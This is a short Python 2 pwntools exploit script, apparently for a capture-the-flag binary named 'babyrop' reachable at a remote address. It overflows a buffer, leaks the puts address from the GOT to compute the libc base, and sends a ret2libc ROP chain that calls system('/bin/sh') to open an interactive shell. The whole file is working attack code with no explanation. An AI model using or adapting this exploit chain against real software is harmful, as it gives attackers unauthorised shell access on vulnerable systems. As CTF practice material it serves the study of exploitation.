#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './babyrop'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('101.71.29.5', 10041)
	libc = ELF('../x86_libc.so.6')
else:

	p = process('./babyrop')
	libc = elf.libc
#gdb.attach(p, 'b* 0x08048590')
dbg()

read_plt = 0x080483D8
puts_plt = 0x080483E0
vlun = 0x0804853D
puts_got = 0x08049FF0

ret = 0x080485FC
payload = 'a'*0x20 + p32(0x66666666)
p.recvline()
p.send(payload)


#leak
payload = 'a'*0x14
payload += p32(puts_plt)
payload += p32(vlun)
payload += p32(puts_got)
p.recvline()
p.send(payload)
puts_addr = u32(p.recvline().strip('\x0a').ljust(4, '\x00'))
print "puts_addr ==> " + hex(puts_addr)

libc.address = puts_addr - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search('/bin/sh\x00'))


payload = 'a'*0x14
payload += p32(ret)
payload += p32(system)
payload += p32(vlun)
payload += p32(binsh)
p.recvline()
p.send(payload)


p.interactive()
p.close()